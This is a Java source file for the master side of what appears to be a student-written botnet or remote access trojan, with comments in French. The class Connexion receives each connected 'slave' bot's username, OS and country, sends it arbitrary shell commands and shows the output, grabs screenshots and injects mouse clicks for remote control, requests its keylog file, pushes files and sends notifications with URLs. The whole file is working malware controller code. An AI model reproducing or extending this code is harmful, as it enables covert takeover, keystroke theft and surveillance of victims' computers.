package master;

import gui.MTerminalJInternalFrame;

import java.awt.FlowLayout;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ArrayBlockingQueue;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

import remote.action.ActionVNC;
import remote.action.BougerSouris;
import remote.action.ClickerSouris;
import remote.action.ScreenShot;
import send.specific.object.ReceivedSpecificObject;
import send.specific.object.SendSpecificObject;
import constante.Constante;

public class Connexion
{

	/**
	 * Classe qui se charge de l'affichage de l'écran de l'esclave Permet de
	 * prendre le controle de la souris, et naviguer sur l'ordinateur de
	 * l'esclave Fonctionnement 75 %
	 * 
	 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
	 */

	public static class Affichage
	{
		// Parametres :
		// =====================================================================

		private Timer									m_timer;
		private boolean								m_isLaunched;		// Est utilisé dans le code principal pour
		// lancer le timer
		private JLabel									m_jlabel;			// Le jlabel contenant l'image
		private JFrame									m_frame;				// La fenètre
		private ArrayBlockingQueue<ActionVNC>	m_actionVNCQueue; // Pour gérer
		// les
		// évenements
		private ImageIcon								ii;
		private BufferedImage						previousImg;

		// Constructeur :
		// =====================================================================

		public Affichage()
		{

			m_isLaunched = false;

			// jlabel crée qui contiendra l'image
			m_jlabel = new JLabel();
			m_jlabel.addMouseListener(new MouseAdapter()
			{
				public void mouseClicked(MouseEvent e)
				{
					m_actionVNCQueue.add(new BougerSouris(e));
					m_actionVNCQueue.add(new ClickerSouris(e));
					m_actionVNCQueue.add(new ScreenShot());
				}
			});

			// instanciation de la pile d'objets
			m_actionVNCQueue = new ArrayBlockingQueue<>(30);

			// la fenetre
			m_frame = new JFrame();
			m_frame.setVisible(false);
			m_frame.getContentPane().setLayout(new FlowLayout());
			m_frame.add(m_jlabel);
			m_frame.addWindowListener(new WindowAdapter()
			{
				public void windowClosing(WindowEvent e)
				{
					stopTimer();
					e.getWindow().dispose();
				}
			});

			// Gere la pile d'evenements pour eviter un stress
			Thread envoi = new Thread()
			{
				public void run()
				{
					ActionVNC ra = null;
					while (true)
					{
						if (!m_actionVNCQueue.isEmpty())
						{
							ra = m_actionVNCQueue.poll();
							try
							{
								_out.writeObject(ra);
								_out.flush();
							}
							catch (IOException e)
							{
								e.fillInStackTrace();
							}
						}
						try
						{
							if (ra instanceof ScreenShot)
								sleep(1500);
						}
						catch (InterruptedException e)
						{
							e.fillInStackTrace();
						}
					}
				}
			};
			envoi.start();
		}

		// Lance un Timer qui demande à l'esclave ( le bot ) de lui envoyer une
		// nouvelle image toutes les 5 secs
		public void startTimer()
		{
			m_isLaunched = true;
			m_timer = new Timer();
			m_timer.scheduleAtFixedRate(new TimerTask()
			{

				public void run()
				{
					try
					{
						m_actionVNCQueue.put(new ScreenShot());
					}
					catch (InterruptedException e)
					{
						e.fillInStackTrace();
					}
				}
			}, 1, 5000);
			m_frame.setVisible(true);
		}

		public void stopTimer()
		{
			m_timer.cancel();
		}

		public boolean isLaunched()
		{
			return m_isLaunched;
		}

		public void readImage()
		{
			BufferedImage img = null;

			try
			{
				img = ImageIO.read(_so.getInputStream());
			}
			catch (IOException e)
			{
				e.fillInStackTrace();
			}
			if (img != null)
			{
				previousImg = img;
				ii = new ImageIcon(previousImg);
				m_jlabel.setIcon(ii);
			}
			m_frame.setSize(500, 500);

			/*		frame.remove(jlabel);
					frame.add(jlabel);
					frame.setVisible(true);
			*/

		}

	}

	// Parametres :
	// =====================================================================

	private static ObjectInputStream		_in;						// Flux d'entrée
	private static ObjectOutputStream	_out;					// Flux de sortie // Pour la VNC
	private static String					_user_name;

	private Affichage							_affichage;			// Pour la VNC
	private Compte								_compte;
	private String								_file_separator;
	private String								_ip, _os_name, _numeroConnexion, _pays,
			_os_arch, _os_version;
	private static Socket					_so;
	private MTerminalJInternalFrame		mCmdJInternalFrame;

	

	// Constructeur :
	// =====================================================================

	/**

	 * @param so
	 *            : le socket ouvert pour l'esclave
	 * @param cp
	 *            le compte auquel appartient la connexion
	 * @throws ClassNotFoundException
	 */
	public Connexion(Socket so, Compte cp) throws ClassNotFoundException
	{
		super();
		this._so = so;
		try
		{
			_out = new ObjectOutputStream(_so.getOutputStream());   		 // Ouvre le
			// flux

			_in = new ObjectInputStream(new BufferedInputStream( 			// Ouvre le
					// flux
					_so.getInputStream()));

			String listInformation = (String) _in.readObject(); 			// Recupere les
																							// parametres de
																							// la machine
																							// hôte envoyés
																							// par l'esclave
//			Server.log.enregistrerFichier("\n" + listInformation);
			
			_compte = cp;
			String[] splited = listInformation.split("\\+\\+"); // Affecte les
																								// variables aux
																								// parametres de
			_affichage = new Affichage();
			// la classe
			setFile_separator(splited[1]);
			setUser_name(splited[2]);
			setOs_version(splited[3]);
			setOs_name(splited[4]);
			setOs_arch(splited[5]);
			setPays(splited[6]);
			setIp(so.getInetAddress().toString());
																								// send(); // Lance un Thread d'envoi
			receive(); 																		// Lance un Thread de reception
		}
		catch (IOException e)
		{
			_compte.removeConnection(this);
		}
	}

	public String get_file_separator()
	{
		return _file_separator;
	}

	public String get_ip()
	{
		return _ip;
	}

	public String get_numeroConnexion()
	{
		return _numeroConnexion;
	}

	public String get_os_arch()
	{
		return _os_arch;
	}

	public String get_os_name()
	{
		return _os_name;
	}

	public String get_os_version()
	{
		return _os_version;
	}

	public String get_pays()
	{
		return _pays;
	}

	public Socket get_so()
	{
		return _so;
	}

	public String get_user_name()
	{
		return _user_name;
	}

	public Compte getCompte()
	{
		return _compte;
	}

	public Socket getSo()
	{
		return _so;
	}

	private Connexion getThis()
	{
		return this;
	}

	/**
	 * Methode gérant la reception des objets de l'esclave
	 */
	public void receive()
	{
		Thread reception = new Thread()
		{
			@Override
			public void run()
			{
				try
				{
					while (true)
					{

						Object action = _in.readObject(); // Recupere l'objet
						if (action instanceof Integer)
						{ // Si c'est un code
							Integer code = (Integer) action;
							if (code.equals(Constante.code_vnc))
							{ // ...un code
								// VNC
								Server.m_log.enregistrerFichier("Recoit une image");
								_affichage.readImage();

							}
							else if (code.equals(Constante.code_cmd))
							{															 // ...un
																						// code
																						// CMD
								Object object = _in.readObject();
								if (object instanceof String)
								{
										String res = (String) object; 			// Recupere la
																							// sortie du
																							// terminal
																							// L'affiche
										mCmdJInternalFrame.append(res);
								}
							}
							else
																						{  // Sinon recoit un fichier
																							// Appelle la methode receivedFile qui
																							// recupere le fichier dans le flux de
																							// byte
								ReceivedSpecificObject.receivedFile((Integer) action,
										_in);
								_compte.getFenetrePrincipale().Addinformation(
										"RECU NOUVEAU FICHIER");
							}
						}

						else
						{
							Server.m_log
									.enregistrerFichier("Fichier inconnu par le serveur");
						}

					}
				}
				catch (IOException e)
				{
					getThis()._compte.removeConnection(getThis());
				}
				catch (ClassNotFoundException | InterruptedException e1)
				{
					e1.printStackTrace();
				}
			}
		};
		reception.start();
	}

	/**
	 * Methode publique qui envoit une commande terminal a un Esclave Est appele
	 * depuis le menu d'Astuces du Maitre
	 * 
	 * @param commande
	 *            : la commande que l'on veut saisir
	 */
	public void sendCmdCommand(String commande)
	{
		mCmdJInternalFrame = null;
		try
		{
			_out.writeObject(Constante.code_cmd);

			_out.flush();

			_out.writeObject(commande);
			_out.flush();
		}
		catch (IOException e)
		{
			_compte.removeConnection(this);
			e.printStackTrace();
		}
	}

	/**
	 * Methode publique qui envoit une commande terminal a un Esclave Est appelé
	 * depuis l'interface graphique principale
	 * 
	 * @param commande
	 *            : la commande que l'on veut saisir
	 * @param parent
	 *            : la fenetre parent
	 */
	public void sendCmdCommand(String commande, MTerminalJInternalFrame parent)
	{
		mCmdJInternalFrame = parent;
		try
		{
			_out.writeObject(Constante.code_cmd);

			_out.flush();
			_out.writeObject(commande);
			_out.flush();
		}
		catch (IOException e)
		{
			_compte.removeConnection(this);
			e.printStackTrace();
		}
	}

	public void sendVNCcommand()
	{

		if (!_affichage.m_isLaunched)
			_affichage.startTimer();

	}

	public void sendfile(File file)
	{
		if (file.canRead() && file.exists())
			try
			{

				SendSpecificObject.sendTxt(file.getName(), file.getPath(), _out);
			}
			catch (IOException e)
			{
				_compte.removeConnection(this);
				e.printStackTrace();
			}
	}

	/**
	 * Methode appelé par l'interface graphique et qui se charge de demander a
	 * un esclave son fichier de Keylog
	 */
	public void sendKeylog()
	{
		Server.m_log.enregistrerFichier("keylog");
		try
		{
			_out.writeObject(Constante.code_keylog);
			_out.flush();
		}
		catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/*
	 * Methode appelé par l'interface graphique et qui se charge d'envoyer un
	 * signal de notification a un esclave
	 */
	public void sendNotification(String message, String url)
	{
		try
		{
			_out.writeObject(Constante.code_notif);
			_out.flush();
			_out.writeObject(message + "++" + url);
			_out.flush();
		}
		catch (IOException e)
		{
			_compte.removeConnection(this);
			e.printStackTrace();
		}
	}

	private void setFile_separator(String file_separator)
	{
		this._file_separator = file_separator;
	}

	private void setIp(String ip)
	{
		this._ip = ip;
	}

	private void setOs_arch(String os_arch)
	{
		this._os_arch = os_arch;
	}

	private void setOs_name(String os_name)
	{
		this._os_name = os_name;
	}

	private void setOs_version(String os_version)
	{
		this._os_version = os_version;
	}

	private void setPays(String pays)
	{
		this._pays = pays;
	}

	private void setUser_name(String user_name)
	{
		this._user_name = user_name;
	}

}
